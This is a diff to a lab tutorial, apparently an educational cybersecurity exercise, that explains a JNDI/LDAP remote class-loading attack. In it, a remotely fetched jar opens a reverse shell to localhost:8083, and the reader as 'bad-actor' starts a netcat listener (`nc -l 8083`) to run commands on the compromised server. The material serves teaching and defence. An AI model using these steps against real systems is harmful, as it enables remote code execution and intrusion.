@@ -53,7 +53,7 @@ sn: Class
 uid: java-ref
 ```
 
-The URLClassLoader will lookup the `uk.ac.jisc.cybersec.rce.RceExploit` class firstly from the local classpath — where it does not exist — then from the URL codebase provided by the LDAP entry (e.g. remotely via HTTP at `http://localhost:8080/rce/rce-exploit-0.0.1-SNAPSHOT.jar`). This downloads the referenced `jar` file, and instantiates `uk.ac.jisc.cybersec.rce.RceExploit`. Triggering the static method in the malicious class shown below, which attempts to establish a reverse shell to anything listening on port *8083* on *localhost*:
+The URLClassLoader will lookup the `uk.ac.jisc.cybersec.rce.RceExploit` class firstly from the local classpath — where it does not exist — then from the URL codebase provided by the LDAP entry (e.g. remotely via HTTP at `http://localhost:8080/rce/rce-exploit-0.0.1-SNAPSHOT.jar`). This downloads the referenced `jar` file, and instantiates `uk.ac.jisc.cybersec.rce.RceExploit`, triggering the static method shown below. The malicious code attempts to establish a reverse shell to anything listening on port *8083* on *localhost*:
 
 ```java
 package uk.ac.jisc.cybersec.rce;
@@ -81,12 +81,15 @@ public class RceReverseShellExploit {
 }
 ```
 
-To establish a remote network connection to the compromised web-server, you (as the *bad-actor*) must start a listener on port `8083`. For example, using `netcat`:
+To complete the attack and establish a remote network connection to the compromised web-server, you, as the *bad-actor*, must start a listener on port `8083`. For example, using `netcat`:
 
 
 ```bash
 nc -l 8083
 ```
+
+Once the connection is established, can can run bash commands inside the listener you started above e.g. type `ls` into the terminal window running `netcat`.
+
 
 #### Note on Java Version
 
